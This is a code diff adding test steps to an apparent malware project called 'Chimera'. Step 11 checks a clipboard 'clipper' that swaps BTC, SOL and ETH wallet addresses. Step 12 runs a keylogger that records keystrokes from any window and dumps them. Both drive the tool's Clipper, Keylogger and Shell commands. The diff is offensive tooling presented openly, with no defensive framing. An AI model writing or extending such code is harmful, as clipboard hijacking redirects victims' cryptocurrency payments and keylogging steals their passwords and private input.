@@ -157,6 +157,54 @@ namespace Chimera
             catch { }
 
             // ----------------------------------------------------------------
+            // STEP 11: Clipper — start, swap test, stop
+            // ----------------------------------------------------------------
+            Section("11. Clipper test (clipper start + swap)");
+            Log(Commands.Clipper.Execute("start"));
+            Thread.Sleep(800); // let monitor thread spin up
+
+            // Test BTC swap
+            string testBtc = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testBtc + "'\"");
+            Thread.Sleep(800);
+            string afterBtc = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[BTC] sent:    " + testBtc);
+            Log("[BTC] got:     " + afterBtc);
+            Log("[BTC] swapped: " + (afterBtc != testBtc ? "YES" : "NO - clipper may not be running in this context"));
+
+            // Test SOL swap
+            string testSol = "So1endDq2YkqhipRh3WViPa8hdiSpxWy6z3Z6tMCpAo";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testSol + "'\"");
+            Thread.Sleep(800);
+            string afterSol = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[SOL] sent:    " + testSol);
+            Log("[SOL] got:     " + afterSol);
+            Log("[SOL] swapped: " + (afterSol != testSol ? "YES" : "NO"));
+
+            // Test ETH swap
+            string testEth = "0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe";
+            Commands.Shell.Execute("powershell -c \"Set-Clipboard '" + testEth + "'\"");
+            Thread.Sleep(800);
+            string afterEth = Commands.Shell.Execute("powershell -c \"Get-Clipboard\"").Trim();
+            Log("[ETH] sent:    " + testEth);
+            Log("[ETH] got:     " + afterEth);
+            Log("[ETH] swapped: " + (afterEth != testEth ? "YES" : "NO"));
+
+            Log(Commands.Clipper.Execute("status"));
+            Log(Commands.Clipper.Execute("stop"));
+
+            // ----------------------------------------------------------------
+            // STEP 12: Keylogger — start, type test, dump, stop
+            // ----------------------------------------------------------------
+            Section("12. Keylogger test (keylog start + dump)");
+            Log(Commands.Keylogger.Execute("start"));
+            Thread.Sleep(500);
+            Log("[*] Keylogger running for 3 seconds - type something in any window...");
+            Thread.Sleep(3000);
+            Log(Commands.Keylogger.Execute("dump"));
+            Log(Commands.Keylogger.Execute("stop"));
+
+            // ----------------------------------------------------------------
             // DONE
             // ----------------------------------------------------------------
             Section("=== TEST COMPLETE ===");
